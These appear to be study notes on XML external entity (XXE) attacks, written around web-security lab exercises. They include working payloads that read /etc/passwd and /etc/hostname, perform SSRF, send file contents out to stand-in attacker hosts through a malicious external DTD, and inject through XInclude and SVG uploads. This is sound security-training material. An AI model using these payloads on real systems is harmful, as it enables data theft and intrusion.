allow an attack to interfere with an application's processing of XML data
	- can view files on the application server filesystem and interact with any back-end or external system that the application can access
- can XXE into SSRF
# XML Basics
- XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.
	- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.
	- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.
	- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.
	- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
	- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.
# Exploiting XXE To Retrieve Files 
- introduce or edit a `DOCTYPE` element that defines an external entity containing the path to the file
- or edit a data value in the XML that is returned in the application's response, to make use of the defined external entity
if given the following:
	```XML
	<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck><productId>381</productId></stockCheck>
	```
modify as such:
	```XML 
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck><productId>&xxe;</productId></stockCheck>
	```
Lab: [[Exploiting XXE using external entities to retrieve files]]
# Exploiting XXE To Perform SSRF
use the following:
	`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
then use the defined entity `xxe` within a data value
Lab: [[Exploiting XXE to perform SSRF attacks]]
# Blind XXE
- use OAST techniques
	- make a back-end request to a server you control
		`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`
Lab: [[Blind XXE with out-of-band interaction]]
## Blind XXE Using Parameter Entities
- sometimes regular entities are not allowed due to input validation 
	- use parameter entities instead
	- declared with `%` before `ENTITY`
	- referenced with  `%` as well
		```XML
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
		<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
		```
## Exploiting Blind XXE To Exfiltrate Data Out-Of-Band
- host a malicious DFD on your server that will be loaded in the vulnerable application, which will output sensitive contents and send it to the attacker server.
### Malicious DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://burp-collaborator-domain/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:
1. **Definition of Parameter Entities:**
    - An XML parameter entity, `%file`, is created, reading the content of the `/etc/hostname` file.
    - Another XML parameter entity, `%eval`, is defined. It dynamically declares a new XML parameter entity, `%exfiltrate`. The `%exfiltrate` entity is set to make an HTTP request to the collaborator or attacker's server, passing the content of the `%file` entity within the query string of the URL.
	    - `&#x25;` is the hexadecimal representation of `%` which is used to define `exfiltrate` parameter entity within `eval`
1. **Execution of Entities:**
    - The `%eval` entity is utilised, leading to the execution of the dynamic declaration of the `%exfiltrate` entity.
    - The `%exfiltrate` entity is then used, triggering an HTTP request to the specified URL with the file's contents
The attacker hosts this malicious DTD on a server under their control, typically at a URL like `http://web-attacker.com/malicious.dtd`.
### XXE Payload:
- To exploit a vulnerable application, the attacker sends an XXE payload:
	```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
	<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
	```
- This payload defines an XML parameter entity `%xxe` and incorporates it within the DTD. When processed by an XML parser, this payload fetches the external DTD from the attacker's server. 
- The parser then interprets the DTD inline, executing the steps outlined in the malicious DTD and leading to the exfiltration of the `/etc/hostname` file to the attacker's server.
Lab: [[Exploiting blind XXE to exfiltrate data using a malicious external DTD]]
## Exploiting Blind XXE To Retrieve Data Via Error Messages
- malicious DTD as follows:
		```xml
		<!ENTITY % file SYSTEM "file:///etc/passwd">
		<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
		%eval;
		%error;
		```
1. An XML parameter entity named `file` is defined, which contains the contents of the `/etc/passwd` file.
2. An XML parameter entity named `eval` is defined, incorporating a dynamic declaration for another XML parameter entity named `error`. This `error` entity, when evaluated, attempts to load a nonexistent file, incorporating the contents of the `file` entity as its name.
3. The `eval` entity is invoked, leading to the dynamic declaration of the `error` entity.
4. Invocation of the `error` entity results in an attempt to load a nonexistent file, producing an error message that includes the contents of the `/etc/passwd` file as part of the file name.
The malicious DTD is invoked with the following:
	```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
	<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
	```

Lab: [[Exploiting blind XXE to retrieve data via error messages]]
# Finding Hidden Attack Surface For XXE Injections
## `XInclude`
- when integrating client data into server-side XML documents, like those in backend SOAP requests, direct control over the XML structure is often limited, hindering traditional XXE attacks due to restrictions on modifying the `DOCTYPE` element
- `XInclude` attacks allow insertion of external entities within any data element of the XML document
- to execute, `XInclude` namespace and provide the path to the file that you wish to include
	```xml 
	productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
	```
Lab: [[Exploiting XInclude to retrieve files]]
## File Uploads
- files uploaded by users which are then processed on the server, can exploit vulnerabilities in how XML or XML-containing file formats are handled
	- SVG or DOCX files 
		- SVG is a XML-based format - can be used to submit malicious SVG images
		```
			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image               xlink:href="file:///etc/hostname"></image></svg>
		```
OR 
	```
	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
	```
Latter is recommended. Paste this into a `.svg` file
Lab: [[Exploiting XXE via image file upload]]